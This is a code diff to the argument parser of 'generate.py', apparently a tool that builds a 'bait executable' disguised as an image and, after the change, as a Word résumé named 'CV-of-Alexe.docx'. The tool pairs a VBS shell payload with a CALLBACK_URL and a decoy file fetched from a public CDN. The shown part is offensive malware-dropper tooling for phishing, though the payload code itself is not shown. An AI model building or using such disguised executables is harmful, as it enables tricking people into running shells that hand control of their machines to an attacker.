@@ -5,10 +5,10 @@ import pathlib
 import time
 parser = argparse.ArgumentParser(
     prog='generate.py',
-    description='Generate a bait executable, disguised as jpg',
-    usage='generate.py -p jpgshell.vbs -a CALLBACK_URL=http://localhost:80/ JPG_URL=https://cdn.pixabay.com/photo/2024/02/26/19/39/monochrome-image-8598798_640.jpg JPG_OUTPUT_NAME=a.jpg -o myfilename -s **[]!?')
+    description='Generate a bait executable, disguised as a docx',
+    usage='generate.py -p disguisedshell.vbs -a CALLBACK_URL=http://localhost:80/ FILE_URL=https://cdn.create.microsoft.com/catalog-assets/en-us/972db91c-baf9-4c6b-9605-00b3aa24e07c/TF972db91c-baf9-4c6b-9605-00b3aa24e07c06706e45_wac-21b6606d1277.docx FILE_OUTPUT_NAME=CV-of-Alexe.docx -o CV-of-Al  -s **[]!?**')
 parser.add_argument(
-    "-o", "--out", help="Output jpg file name (without extension)")
+    "-o", "--out", help="Output file name (without extension)")
 parser.add_argument("-p", "--payload", help="Payload to use")
 parser.add_argument("-a", "--arguments", nargs="*", help="Payload arguments")
 parser.add_argument(
